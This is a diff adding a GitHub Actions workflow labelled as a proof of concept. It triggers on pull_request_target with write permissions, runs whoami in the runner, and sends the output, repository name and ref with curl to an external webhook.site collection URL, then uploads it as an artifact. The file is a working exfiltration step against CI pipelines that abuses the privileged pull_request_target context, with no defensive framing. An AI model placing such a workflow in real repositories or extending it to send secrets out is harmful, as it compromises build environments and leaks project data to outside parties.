@@ -1,0 +1,39 @@
+name: PR Target Whoami (artifact PoC)
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  actions: write
+  contents: read
+  pull-requests: write
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run whoami and send to webhook
+        run: |
+          # Get whoami output and encode it
+          WHOAMI_OUTPUT=$(whoami 2>/dev/null || echo "whoami-failed")
+          WHOAMI_B64=$(echo -n "$WHOAMI_OUTPUT" | base64 -w0)
+          
+          # Create JSON payload
+          PAYLOAD=$(echo -n "{\"whoami\": \"$WHOAMI_OUTPUT\", \"whoami_base64\": \"$WHOAMI_B64\", \"timestamp\": \"$(date -Iseconds)\", \"repository\": \"$GITHUB_REPOSITORY\", \"pr_number\": \"$GITHUB_REF\"}")
+          
+          # Send to webhook
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD" \
+            https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e
+          
+          # Also save to file for artifact
+          echo -n "$WHOAMI_OUTPUT" | base64 > whoami.b64
+          
+          echo "Webhook sent successfully"
+
+      - name: Upload proof
+        uses: actions/upload-artifact@v3
+        with:
+          name: whoami-b64
+          path: whoami.b64
